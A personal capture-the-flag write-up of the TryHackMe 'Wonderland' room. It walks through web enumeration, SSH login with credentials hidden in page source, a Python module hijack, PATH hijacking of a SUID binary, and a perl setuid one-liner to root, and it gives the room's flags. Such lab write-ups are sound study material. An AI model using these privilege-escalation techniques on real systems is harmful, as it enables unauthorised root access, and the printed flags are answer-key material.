---
title: "Wonderland"
date: 2025-01-19
slug: wonderland
tags: [tryhackme, linux, web, privesc]
difficulty: Medium
---
IP = 10.10.35.248

----

**Enumeration**

```
❯ nmap -sCV 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)


80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```
❯ gobuster dir -u http:/// -w ~/ctf/wordlist/directory-list-2.3-medium.txt -x php,html,js


/index.html           (Status: 301) [Size: 0] [--> ./]
/img                  (Status: 301) [Size: 0] [--> img/]
/r                    (Status: 301) [Size: 0] [--> r/]
/poem                 (Status: 301) [Size: 0] [--> poem/]

```


**/img** - had 3 images 
![[Pasted image 20250119150516.png]]
2 images are same but there are different extentions we can use steganography tools or metadata extractors to view details and one rabbit image(had nothing in metadata)


**/poem** 
![[Pasted image 20250119150804.png]]



**/r** - the page code gives the *hint to follow the white rabbit* ,
also it says keep going 

![[Pasted image 20250119150449.png]]


tried but failed - 
we have a white rabbit image in the /img directory there we can find further clues im also thinking there must be something hidden in the image
- metadata reveals nothing 

the webpage also says to keep going so we can try gobuster to enumerate further of /r/ 

```
❯ gobuster dir -u http:///r/ -w ~/ctf/wordlist/directory-list-2.3-medium.txt -x php,html,js

/index.html           (Status: 301) [Size: 0] [--> ./]
/a                    (Status: 301) [Size: 0] [--> a/]
```

this redirected to a page and with the help of the clue follow the rabbit we know and form the path we need to reach
using 


`http:///r/a/b/b/i/t/`
![[Pasted image 20250119152121.png]]

in the website source we get 
```
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```
which is not rendered in the website 

using gobuster for enumerating further this page till then i will try to use this to get access to SSH 

---

**exploitation**

uname - alice 
pass - HowDothTheLittleCrocodileImproveHisShiningTail
```
❯ ssh alice@
The authenticity of host ' ()' can't be established.
ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '' (ED25519) to the list of known hosts.
alice@'s password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jan 19 09:56:35 UTC 2025

  System load:  0.64               Processes:           84
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 30%                IP address for eth0: 
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ 
```
and it worked as uname and pass for ssh 


```
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ ls -al
total 40
drwxr-xr-x 5 alice alice 4096 May 25  2020 .
drwxr-xr-x 6 root  root  4096 May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache
drwx------ 3 alice alice 4096 May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
alice@wonderland:~$ 
```

alice has the root.txt but doesn't have access to read it 
```
alice@wonderland:/home$ ls
alice  hatter  rabbit  tryhackme
```
4 users 


running linpeas

```
❯ python -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.95.46 - - [19/Jan/2025 19:09:02] "GET /linpeas.sh HTTP/1.1" 200 -
```


```
alice@wonderland:~$ wget 10.17.26.44:8888/linpeas.sh
--2025-01-19 13:39:01--  http://10.17.26.44:8888/linpeas.sh
Connecting to 10.17.26.44:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 830426 (811K) [application/x-sh]
Saving to: ‘linpeas.sh.1’

linpeas.sh.1                                  100%[===============================================================================================>] 810.96K   440KB/s    in 1.8s    

2025-01-19 13:39:03 (440 KB/s) - ‘linpeas.sh.1’ saved [830426/830426]
```

*running linpeas we understand that hatter has permission to run perl which is a potential privEsc vector* 


---


**privEsc**

```
alice@wonderland:/home$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
we can run python and the python file as user **rabbit** 

for a very specific reason we have access to python and the other file 
the other file uses a random.py module we can use  **Python Module Manipulation** attack here 

**python module manipulation** -
this is a type of privilege escalation technique in which we take advantage of python's weaknesses 
python searches for a module in 6 different places precedence wise first it will check in the current directory then env path then standard library 
so if we have our malicious script named random.py in the same directory then it will use that module for our script so we can make use of it 

```random.py
import os
os.system("/bin/bash")
```

as we can run the command `/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py` as user rabbit then after using this technique we can get bash shell into user rabbit 


using this command we now have access to rabbit's account 

```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
[sudo] password for alice: 
rabbit@wonderland:~$ 
```


in the rabbit's home directory we found 

```
rabbit@wonderland:/home/rabbit$ ls -l
total 20
-rwsr-sr-x 1 root root 16816 May 25  2020 teaParty


rabbit@wonderland:/home/rabbit$ file teaParty 
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped

```

which is a SUID file and owned by root and is a binary 

we cant do further operations in the file so we will use scp to get the file in our device 

target machine - 
```
rabbit@wonderland:/home/rabbit$ nc -w 0 -lnvp 9999 < teaParty 
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.17.26.44 52050 received!
```

our machine - 
`❯ ncat  9999 > teaParty_copy`


now we can run strings command on it 

```
❯ strings teaParty_copy

Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0

```
(I have included only necessary strings)

the code uses the absolute path for echo command but not for the date command and that means we can abuse that

for the this we can make our own date binary with a code to open new shell, and place it in this directory of rabbit and then set the path accordingly so that the shell looks for the date binary in this directory and as the teaParty has SUID of hatter it will spawn the shell as the user hatter 


//note - IP changed = 10.10.95.46

by making a binary date in our home directory  with code

```date

#!/bin/bash

/bin/bash -p
```

setting it to env path - 
`rabbit@wonderland:/home/rabbit/attack$ export PATH=/home/rabbit/attack:$PATH`

now after running teaParty we should have access to hatter 
```
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ 
```

```
hatter@wonderland:/home/hatter$ ls
password.txt
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?
```

password for hatter - WhyIsARavenLikeAWritingDesk?

```
hatter@wonderland:/home/hatter$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```
we are still not hatter 

command to become hatter 
```
hatter@wonderland:/home/hatter$ su hatter
Password: 
hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
```

we know from linpeas.sh that hatter has perms to run perl 

```
Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

perl has capability of SUID 

using GTFObins - https://gtfobins.github.io/gtfobins/perl/#capabilities

```
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root
```


findings - 


user.txt - thm{"Curiouser and curiouser!"}

root.txt - thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}







---
learned 
- sudo `/etc/sudoers.d` has the `sudo -l `output if we dont have password to the user we can use it 
- always remember you have `scp` if u are doing `ssh` into a machine to send `linpeas.sh`
- python module manipulation 
- check what users access we have when doing `sudo -l `here it was rabbit not root and the format for executing it as other users 
- how to exploit binaries
